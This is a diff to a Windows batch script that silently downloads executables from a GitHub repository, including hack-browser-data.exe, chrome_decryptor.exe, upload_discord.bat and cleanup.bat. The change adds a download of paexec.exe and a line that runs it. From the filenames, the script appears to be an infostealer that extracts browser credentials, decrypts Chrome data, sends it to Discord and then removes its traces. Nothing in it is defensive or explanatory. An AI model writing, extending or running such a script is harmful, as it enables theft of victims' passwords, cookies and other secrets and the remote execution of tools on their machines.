@@ -42,6 +42,8 @@ curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigb
 curl -L -s -o chrome_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_decryptor.exe
 curl -L -s -o system_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/system_decryptor.exe
 
+curl -L -s -o paexec.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/paexec.exe
+
 curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/upload_discord.bat
 curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat
 
@@ -52,7 +54,7 @@ for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat chr
         exit /b 4
     )
 )
-
+paexec.exe
 REM Create running flag
 echo %datetime% > "%tempdir%\running.tmp"
 echo Starting process----------------------------------------
